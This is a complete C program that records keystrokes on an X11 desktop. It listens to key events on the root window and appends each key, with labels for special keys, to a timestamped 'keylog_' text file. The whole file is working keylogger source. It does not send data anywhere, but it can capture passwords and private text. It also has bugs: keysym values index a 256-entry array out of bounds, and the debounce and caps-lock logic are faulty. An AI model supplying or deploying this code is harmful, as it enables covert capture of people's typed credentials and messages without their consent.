#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <time.h>

#define DEBOUNCE_DELAY 0.025 // Adjust as needed (in seconds)

FILE* logFile;
char logName[300];

KeySym previousKeyCode = 0;
time_t previousKeyTime = 0;

// Structure to track key state and debounce time
struct KeyState {
    Bool down;
    time_t lastEventTime;
};

// Map key codes to debounce state
struct KeyState keyStates[256] = {0};

char* convertKeyCode(KeySym keyCode, Bool shiftPressed, Bool capsLockOn) {
    // Handle alphanumeric keys
    if (keyCode >= XK_space && keyCode <= XK_asciitilde) {
        static char buf[2] = {0};
        if (shiftPressed ^ capsLockOn) {
            buf[0] = XK_ToUpper(keyCode);
        } else {
            buf[0] = keyCode;
        }
        return buf;
    }
    // Handle special keys
    switch (keyCode) {
        case XK_Return: return "[return]";
        case XK_Tab: return "[tab]";
        case XK_BackSpace: return "[backspace]";
        case XK_Escape: return "[esc]";
        case XK_Delete: return "[del]";
        case XK_Caps_Lock: return "[caps]";
        case XK_Shift_L: return "[left-shift]";
        case XK_Shift_R: return "[right-shift]";
        case XK_Control_L: return "[left-ctrl]";
        case XK_Control_R: return "[right-ctrl]";
        case XK_Alt_L: return "[left-alt]";
        case XK_Alt_R: return "[right-alt]";
        case XK_Super_L: return "[left-super]";
        case XK_Super_R: return "[right-super]";
        case XK_Left: return "[left]";
        case XK_Right: return "[right]";
        case XK_Up: return "[up]";
        case XK_Down: return "[down]";
        default: return "[unknown]";
    }
}

int createLog(FILE** logFile, char* logName) {
    // Generate filename with date and time
    time_t rawtime;
    struct tm* timeinfo;
    char timeBuffer[80];

    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d_%H-%M-%S", timeinfo);

    snprintf(logName, 300, "keylog_%s.txt", timeBuffer);

    *logFile = fopen(logName, "a");
    if (*logFile == NULL) {
        perror("fopen");
        return 1;
    }
    return 0;
}

void logKeyEvent(KeySym keyCode, Bool shiftPressed, Bool capsLockOn) {
    const char* keyString = convertKeyCode(keyCode, shiftPressed, capsLockOn);
    fprintf(logFile, "%s", keyString);
    fflush(logFile);
}

void handleKeyEvent(Display* display, XKeyEvent* event) {
    KeySym keySym = XLookupKeysym(event, 0);
    Bool keyDown = (event->type == KeyPress);
    time_t currentTime = time(NULL);

    // Debounce handling
    if (keyStates[keySym].down != keyDown) {
        double debounceTime = difftime(currentTime, keyStates[keySym].lastEventTime);
        if (debounceTime < DEBOUNCE_DELAY) {
            return;
        }
        keyStates[keySym].down = keyDown;
        keyStates[keySym].lastEventTime = currentTime;
    }

    Bool shiftPressed = (event->state & ShiftMask);
    Bool capsLockOn = (event->state & LockMask) && (event->state & ShiftMask);

    if (keyDown) {
        logKeyEvent(keySym, shiftPressed, capsLockOn);
    }

    previousKeyCode = keySym;
    previousKeyTime = currentTime;
}

int main() {
    Display* display = XOpenDisplay(NULL);
    if (!display) {
        fprintf(stderr, "ERROR: Unable to open X display.\n");
        return 1;
    }

    if (createLog(&logFile, logName) != 0) {
        return 2;
    }

    if (logFile == NULL) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        return 3;
    }

    XEvent event;
    XKeyEvent* keyEvent;

    XSelectInput(display, DefaultRootWindow(display), KeyPressMask | KeyReleaseMask);

    fprintf(logFile, "\n\nKeylogging has begun.\n");
    fflush(logFile);

    while (1) {
        XNextEvent(display, &event);
        switch (event.type) {
            case KeyPress:
            case KeyRelease:
                keyEvent = (XKeyEvent*)&event;
                handleKeyEvent(display, keyEvent);
                break;
            default:
                break;
        }
    }

    fclose(logFile);
    XCloseDisplay(display);
    return 0;
}
